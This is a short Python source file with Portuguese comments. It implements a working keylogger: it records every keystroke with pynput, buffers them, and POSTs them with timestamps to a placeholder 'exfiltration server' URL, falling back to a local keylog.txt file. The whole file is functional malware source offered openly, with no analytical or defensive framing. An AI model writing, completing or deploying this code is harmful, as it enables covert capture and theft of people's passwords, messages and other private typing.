import requests
from pynput.keyboard import Listener
from datetime import datetime

# Configurações do servidor de exfiltração
SERVER_URL = "<SERVIDOR PARA RECEBER INFORMAÇÕES AQUI>"

# Lista para armazenar as teclas
buffer = []
BUFFER_SIZE = 100  # Quantidade de teclas antes de enviar

# Função para enviar dados ao servidor
def send_data():
    global buffer
    if buffer:  # Apenas envia se o buffer não estiver vazio
        try:
            # Concatenar todas as teclas em uma única string
            data = {
                "timestamp": datetime.now().isoformat(),
                "keys": "".join(buffer)
            }
            response = requests.post(SERVER_URL, json=data)
            if response.status_code == 200:
                buffer.clear()  # Limpa o buffer apenas se a requisição for bem-sucedida
        except Exception as e:
            save_local("".join(buffer))  # Salva localmente em caso de erro no envio
            buffer.clear()

# Função para salvar localmente (backup)
def save_local(data):
    timestamp = datetime.now().isoformat()
    with open("keylog.txt", "a") as file:
        file.write(f"[{timestamp}] {data}\n")

# Função que captura cada tecla pressionada
def on_press(key):
    global buffer
    try:
        # Identificar e processar teclas especiais
        if hasattr(key, 'char') and key.char is not None:
            buffer.append(key.char)  # Tecla alfanumérica ou símbolo
        elif key == key.space:
            buffer.append(" ")  # Substituir espaço
        elif key == key.enter:
            buffer.append("[ENTER]\n")  # Representação legível para ENTER
        elif key == key.backspace:
            buffer.append("[BACKSPACE]")  # Representação legível para BACKSPACE
        else:
            buffer.append(f"[{key.name}]")  # Outras teclas especiais

        # Enviar quando o buffer atingir o tamanho definido
        if len(buffer) >= BUFFER_SIZE:
            send_data()
    except Exception as e:
        save_local(str(key))

# Configurar o listener de teclado
if __name__ == "__main__":
    with Listener(on_press=on_press) as listener:
        listener.join()
